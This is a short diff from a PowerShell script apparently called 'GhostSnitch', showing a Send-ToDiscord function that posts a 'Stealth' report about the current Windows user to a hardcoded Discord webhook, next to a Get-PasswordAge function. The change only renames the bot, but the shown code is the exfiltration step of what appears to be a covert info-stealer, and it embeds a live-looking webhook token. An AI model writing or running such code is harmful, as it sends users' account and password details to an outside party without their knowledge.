@@ -147,7 +147,7 @@ function Get-PasswordAge {
 function Send-ToDiscord {
     $webhook = 'https://discord.com/api/webhooks/1364536515954348032/3H6tkezlhYibD9CB6qAE62ON__BTvWcGEtuihmz7NylPZOhDYcjO0gq8BOuS-lLvDBBg'
     $payload = @{
-        username = "👻 GhostSnitch (Stealth)"
+        username = "👻 GhostSnitch Bot"
         content = "Stealth roast log for `$env:USERNAME"
         embeds = @(@{
             title = "GhostSnitch Report - Full Info"
